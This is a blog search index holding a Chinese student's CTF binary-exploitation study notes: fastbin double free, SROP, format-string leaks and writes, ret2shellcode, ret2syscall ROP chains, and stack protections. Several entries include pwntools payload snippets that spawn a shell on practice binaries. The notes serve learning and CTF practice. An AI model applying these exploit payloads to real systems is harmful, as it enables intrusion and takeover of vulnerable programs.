<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>first</title>
      <link href="/2025/05/31/first/"/>
      <url>/2025/05/31/first/</url>
      
        <content type="html"><![CDATA[<h1 id="今天是2025年5月31日18-49-55，成功搭建博客"><a href="#今天是2025年5月31日18-49-55，成功搭建博客" class="headerlink" title="今天是2025年5月31日18:49:55，成功搭建博客"></a>今天是2025年5月31日18:49:55，成功搭建博客</h1><h1 id="今天距离2025年高考还有6天，祝老套考出自己满意的成绩"><a href="#今天距离2025年高考还有6天，祝老套考出自己满意的成绩" class="headerlink" title="今天距离2025年高考还有6天，祝老套考出自己满意的成绩"></a>今天距离2025年高考还有6天，祝老套考出自己满意的成绩</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/05/23/off%20by%20one/"/>
      <url>/2025/05/23/off%20by%20one/</url>
      
        <content type="html"><![CDATA[<p>太困了明天写吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/05/23/fastbin%20double%20free/"/>
      <url>/2025/05/23/fastbin%20double%20free/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> </span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span></span><br><span class="line"> <span class="number">4</span> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class"> 5 &#123;</span></span><br><span class="line"> <span class="number">6</span>     <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line"> <span class="number">7</span>     <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line"> <span class="number">8</span>     <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line"> <span class="number">9</span>     <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line"><span class="number">10</span> &#125; CHUNK,*PCHUNK;</span><br><span class="line"><span class="number">11</span> </span><br><span class="line"><span class="number">12</span> CHUNK bss_chunk;</span><br><span class="line"><span class="number">13</span> </span><br><span class="line"><span class="number">14</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">15 &#123;</span><br><span class="line"><span class="number">16</span>     <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line"><span class="number">17</span>     <span class="type">void</span> *chunk_a,*chunk_b;</span><br><span class="line"><span class="number">18</span> </span><br><span class="line"><span class="number">19</span>     bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line"><span class="number">20</span>     chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">21</span>     chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">22</span> </span><br><span class="line"><span class="number">23</span>     <span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(chunk2);</span><br><span class="line"><span class="number">25</span>     <span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="number">26</span> </span><br><span class="line"><span class="number">27</span>     chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">28</span>     *(<span class="type">long</span> <span class="type">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line"><span class="number">29</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">30</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">31</span>     chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">32</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,chunk_b);</span><br><span class="line"><span class="number">33</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">34</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>被释放的堆会被放入fastbin单向链表里面![[Pasted image 20250523213334.png]]<br>依次释放3个堆，会形成这样一个单向链表，每一个堆的fd会指向下个堆的prev_size，这里chunk1   fd为0。同时还有一个main_arena指向chunk3（就是最后释放的堆）。在free堆的时候会验证main_arena指向的堆，如果是同一个就爆炸了。但是只会检测这一个。<br>![[Pasted image 20250523214302.png]]<br>先free一个chunk1，再free一个chunk2，再free一次chunk1，就会形成一个这样的链表。![[Pasted image 20250523214556.png]]<br>此时再malloc就会从左到右检索，比如我再申请一个一样大小的，就会优先看chunk1的位置，如果符合就会申请这个堆。<br>如果我把chunk1的位置申请为堆A(<mark style="background: #FFB86CA6;">这个时候chunk1就处于已申请和free的量子叠加态，一方面我们申请了它，可以往里面输入内容：另一方面链表里面还有它，用户区的内容会被视为fd和bk</mark>)，再把堆A用户区第一个位置改为bss_chunk的地址（对应的是已释放堆的fd位置），那么链表最右边那个chunk1就会指向bss_chunk那么我们在&#x3D;&#x3D;chunk_b&#x3D;malloc(0x10);&#x3D;&#x3D;这一步申请的就是bss_chunk这个堆</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/05/10/mprotect/"/>
      <url>/2025/05/10/mprotect/</url>
      
        <content type="html"><![CDATA[<p>[[mprotect 32例题]]<br>静态编译的题目，可能藏有mprotect函数<br>![[Pasted image 20250510125245.png|1000]]</p><ul><li>开始地址必须是内存页的起始地址（末3位是000）</li><li>长度要是内存页长度的整数倍<br>把指定位置的权限改为可读可写可执行，再通过read函数在同样的地址和同样的长度注入shellcode，然后执行shellcode，获得权限</li></ul><h1 id="可读可写可执行对应的第三个参数是0x7"><a href="#可读可写可执行对应的第三个参数是0x7" class="headerlink" title="可读可写可执行对应的第三个参数是0x7"></a>可读可写可执行对应的第三个参数是0x7</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/04/13/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2025/04/13/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p>在函数调用时，bp位置是调用前的地址，在调用完后先   mov sp，bp  后pop bp就会返回，通过栈溢出覆盖改写bp位置存的地址就能改变bp返回后的地址</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/04/13/srop/"/>
      <url>/2025/04/13/srop/</url>
      
        <content type="html"><![CDATA[<p>升级版ret2syscall<br>[[srop例题]]</p><ul><li>特点：不会有直接的函数，而是有syscall+调用号来使用函数，其中一般有syscall 1也就是read函数，而且读入的值很大（因为要构造的payload很长）</li><li>关键代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=SigreturnFrame()</span><br><span class="line">a.rdi=<span class="number">59</span>                     <span class="comment">#rdi=59表示系统调用号的值为59，即`execve`</span></span><br><span class="line">a.rsi=bss-<span class="number">0x30</span>               <span class="comment">#指向/bin/sh地址或存放/bin/sh的数组的地址</span></span><br><span class="line">a.rdx=<span class="number">0</span>                      </span><br><span class="line">a.rcx=<span class="number">0</span>                      <span class="comment">#execve的后两个参数</span></span><br><span class="line">a.rsp=bss+<span class="number">0x38</span></span><br><span class="line">a.rip=syscall                <span class="comment">#触发execve的调用</span></span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+flat(rdi,<span class="number">0xf</span>,syscall,a))</span><br><span class="line"><span class="comment">#rdi,0xf,syscall触发`sigreturn`回复寄存器状态</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/03/30/ret2csu/"/>
      <url>/2025/03/30/ret2csu/</url>
      
        <content type="html"><![CDATA[<p>![[Pasted image 20250331215832.png]]</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/03/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B232%E4%BD%8D/"/>
      <url>/2025/03/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B232%E4%BD%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s); </span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure><p>这种<code>printf</code>不使用占位符的写法，如果在<code>scanf</code>输入时输入%p，%s之类的格式化字符串，导致在<code>printf</code>解读时找不到参数，就会泄露栈上的内容</p><h1 id="2-基本操作"><a href="#2-基本操作" class="headerlink" title="2.基本操作"></a>2.基本操作</h1><h2 id="查找输入字符的位置"><a href="#查找输入字符的位置" class="headerlink" title="查找输入字符的位置"></a>查找输入字符的位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%p-%p-%p-%p-%p-%p-%p</span><br></pre></td></tr></table></figure><p>在输出中找到0x61616161(即a的ASCII 码)，数出实际输出的内容是第几个参数<br>（一般是6）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">6</span>$p</span><br><span class="line"><span class="comment">#如果偏移是6，向s输入这个可以直接输出第6个参数</span></span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = p32(xxxxxx_got) + <span class="string">&#x27;%4$s&#x27;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用这种代码可以泄露某个函数got地址</p><h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(c_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure><p>%n表示前面有多少有效字符（这里就是p32的4加上12个a一共16）。<code>p32(c_addr)</code>在第6个参数，然后6找到第六个参数，发现是c的地址，于是%n就把16存到c里面</p><h3 id="覆盖任意内存"><a href="#覆盖任意内存" class="headerlink" title="覆盖任意内存"></a>覆盖任意内存</h3><h4 id="覆盖小值"><a href="#覆盖小值" class="headerlink" title="覆盖小值"></a>覆盖小值</h4><p>有多小，比如2。按上面的方法，p32已经有4了，能覆盖的最小的数就是4。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;aa%8&#x27;</span> + <span class="string">&#x27;$naa&#x27;</span> +p32(a_addr)</span><br></pre></td></tr></table></figure><p>如果偏移是6，<code>aa%8</code>就是第6个参数，<code>$naa</code>就在7，<code>p32(a_addr)</code>就在8。所以要%8$n找到第八个参数，发现是a的地址，并且%n前面只有两个a，于是就把2存到a里面</p><h4 id="覆盖大值"><a href="#覆盖大值" class="headerlink" title="覆盖大值"></a>覆盖大值</h4><p><code>%k$n</code>前面有多少个字节，那么就会向第k个参数地址中写多少。那么回来，覆盖大数字能有多大呢？拿b &#x3D; 0x12345678举例，换成十进制的话就是305419896个字节，这就已经非常大了，我们没法构建一个超级长的payload的插入栈中，因为栈的长度可能都没有这么长</p><blockquote><p>使用了h标志位，那么就会向变量b中一次性写两个字节，写两次填满。使用hh标志位会向变量b中一次性写一个字节，写四次填满 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line"><span class="comment">#前面的四个p32每个占4字节，一共16个字节，%104x占104个字节，所以104 + 16 = 120 =0x78，所以%6$hhn会将0x78写到第6个参数，即p32(b_addr)的位置</span></span><br><span class="line"><span class="comment">#%222x占222个字节，再加上前面的字节数：120 + 222 = 342 = 0x156，因为hh是单字，所以只取后面的0x56，所以%7$hhn会将0x56写到第7个参数，即p32(b_addr + 1)的位置</span></span><br><span class="line"><span class="comment">#%222x占222个字节，再加上前面的字节数：342 + 222 = 564 = 0x234，因为hh是单字，所以只取后面的0x34，所以%8$hhn会将0x34写到第8个参数，即p32(b_addr + 2)的位置</span></span><br><span class="line"><span class="comment">#%222x占222个字节，再加上前面的字节数：564 + 222 = 0x312，因为hh是单字，所以只取后面的0x12，所以%9$hhn会将0x12写到第9个参数，即p32(b_addr + 3)的位置</span></span><br><span class="line"><span class="comment">#这样一来我们就完成了对变量b四个字节的填充，填充之后b = 0x12345678</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/03/24/ret2libc/"/>
      <url>/2025/03/24/ret2libc/</url>
      
        <content type="html"><![CDATA[<h1 id="1-libc1"><a href="#1-libc1" class="headerlink" title="1.libc1"></a>1.libc1</h1><p>[[libc1例题]]<br>有system函数和&#x2F;bin&#x2F;sh</p><h1 id="2-libc2"><a href="#2-libc2" class="headerlink" title="2.libc2"></a>2.libc2</h1><p>[[libc2例题]]<br>有system函数，没有&#x2F;bin&#x2F;sh</p><h1 id="3-libc3"><a href="#3-libc3" class="headerlink" title="3.libc3"></a>3.libc3</h1><p>[[libc3例题]]<br>没有system函数，没有&#x2F;bin&#x2F;sh</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/03/21/ret2shellcode/"/>
      <url>/2025/03/21/ret2shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="没有NX保护-，没有system函数"><a href="#没有NX保护-，没有system函数" class="headerlink" title="没有NX保护 ，没有system函数"></a>没有NX保护 ，没有system函数</h2><p>[[ret2shellcode例题]]</p><p>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。所以没有NX保护才能使用这种方法。</p><p>![[Pasted image 20250324181401.png|800]]<br>![[Pasted image 20250322193910.png|600]]![[Pasted image 20250322193953.png|600]]<br>两种方法，关键是在变量里面加入shellcode，再通过栈溢出把程序返回地址改为变量地址，从而执行shellcode</p><h2 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">##这里的 sh 是 shellcraft 库中的一个函数，名为 sh()。这个函数用于生成一个 shellcode，该 shellcode 的功能是创建一个 shell。asm 函数是 pwntools 库中的一个函数，用于将汇编代码（这里是 shellcraft.sh() 生成的）转换成机器码。shellcode 变量存储了这个转换后的机器码。</span></span><br><span class="line"><span class="comment">##使用 pwntools 的 shellcraft 模块生成一个 shellcode，这个 shellcode 会创建一个 shell，asm 函数将 shellcode 从 Python 对象转换成机器码。</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line"><span class="comment">##发送构造的溢出数据到程序中。这里做了几件事情：shellcode.ljust(112, b&#x27;A&#x27;)：将生成的 shellcode 左边填充（左对齐）到 112 个字节长，不足的部分用字符 &#x27;A&#x27; 填充。用来覆盖栈空间和ebp，加上变量地址覆盖ret地址</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/03/21/ret2syscall/"/>
      <url>/2025/03/21/ret2syscall/</url>
      
        <content type="html"><![CDATA[<p><mark style="background: #ABF7F7A6;">有NX保护，没有system函数，静态链接库有一大堆函数</mark></p><p>[[ret2syscall例题]]</p><p>有NX保护，shellcode是无法执行的。使用ropgadget查找构造rop链</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>执行 int 0x80 就可执行对应的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>如果使用execve这个调用来进行获取shell，接下来就需要去找四个参数分别放在eax、ebx、ecx、edx中：<br>execve系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址（其实执行 sh 的地址也可以）<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0</p><h2 id="传参方法"><a href="#传参方法" class="headerlink" title="传参方法"></a>传参方法</h2><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &lt;binary_file&gt; --only &quot;pop|ret&quot; | grep &quot;pop eax ; ret&quot;</span><br></pre></td></tr></table></figure><p>这样的指令找到各个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop 寄存器 ；ret</span><br></pre></td></tr></table></figure><p>的指令地址</p><ul><li>先栈溢出</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret, <span class="number">0xb</span>, pop_edx_pop_ecx_pop_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_0x80</span><br><span class="line"><span class="comment">#pop_eax_ret要覆盖在原来的ret上面</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/03/19/ret2text/"/>
      <url>/2025/03/19/ret2text/</url>
      
        <content type="html"><![CDATA[<p>自带&#x2F;bin&#x2F;sh,利用通过覆盖ret控制程序流执行&#x2F;bin&#x2F;sh</p><ul><li>知识点<ul><li>[[栈溢出]]</li><li>[[ c语言函数调用栈过程]]</li></ul></li><li>[[ret2text例题]]</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/03/19/%E4%BF%9D%E6%8A%A4/"/>
      <url>/2025/03/19/%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-canary（待题）"><a href="#1-canary（待题）" class="headerlink" title="1.canary（待题）"></a>1.canary（待题）</h1><p>函数开始执行的时候就会向往栈里插入cookie信息，当函数真正返回的时候回验证cookie信息是否合法，若果不合法就会停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败，而阻止shellcode的执行</p><h1 id="2-NX（待题）"><a href="#2-NX（待题）" class="headerlink" title="2.NX（待题）"></a>2.NX（待题）</h1><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存表示为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行命令，此时CPU就会抛出异常，而不去执行恶意代码，主要防止在数据区溢出</p><p>​ 正常在栈溢出时通过跳转指令跳转至shellcode，但是NX开启后CPU会对数据区域进行检查，当发现正常程序不执行，并跳转至其他地址后会抛出异常，接下来不会继续执行shellcode，而是去转入异常处理，处理后会禁止shellcode继续执行</p><h1 id="3-pie（待题）"><a href="#3-pie（待题）" class="headerlink" title="3.pie（待题）"></a>3.pie（待题）</h1><p>真实地址随机，表现为ida中前面地址不可见。但是后几位不变</p><p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
